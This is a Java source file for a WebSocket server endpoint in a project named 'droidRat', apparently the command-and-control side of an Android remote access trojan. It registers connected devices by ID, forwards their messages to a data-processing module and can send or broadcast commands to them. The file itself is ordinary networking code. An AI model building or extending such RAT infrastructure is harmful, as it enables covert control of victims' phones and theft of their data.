package com.je_chen.droidRat.module;

import com.je_chen.droidRat.module.process.receive.data.process_super.DataProcess;

import javax.websocket.*;
import javax.websocket.server.ServerEndpoint;
import java.io.IOException;
import java.util.ArrayList;
import java.util.Hashtable;
import java.util.List;

@ServerEndpoint(value = "/websocket")
public class DroidRatWebSocketServer {

    private static final Hashtable<String, Session> userTable = new Hashtable<>();
    private static final List<Session> sessionArrayList = new ArrayList<>();
    private static Session user;
    private DataProcess dataProcess;

    @OnOpen
    public void onOpen(Session session) {
        user = session;
        dataProcess = new DataProcess();
        System.out.println("onOpen");
        sessionArrayList.add(session);
        System.out.println(session.getId() + " connected");
    }

    @OnError
    public void onError(Session session, Throwable throwable) throws IOException {
        session.close(new CloseReason(CloseReason.CloseCodes.UNEXPECTED_CONDITION, "Server Error"));
        throwable.printStackTrace();
    }

    @OnClose
    public void onClose(Session session) {
        System.out.println("onClose");
        sessionArrayList.remove(session);
        System.out.println(session.getId() + " Leave Now,  " + sessionArrayList.size());
    }

    @OnMessage
    public void onMessage(String message, Session session) {
        try {
            if (!message.startsWith("deviceID ")) {
                dataProcess.processString(message);
            } else {
                String[] rawDeviceArray = message.split(" ");
                userTable.put(rawDeviceArray[1], session);
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public void broadcast(String message) {
        for (Session user : sessionArrayList) {
            try {
                user.getBasicRemote().sendText(message);
            } catch (IOException e) {
                e.printStackTrace();
            }
        }
    }

    public void sendText(String message) {
        try {
            user.getBasicRemote().sendText(message);
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    public void clearUser() {
        sessionArrayList.clear();
    }

    public Hashtable<String, Session> getUserTable() {
        return userTable;
    }

    public void clearTable() {
        userTable.clear();
    }

}
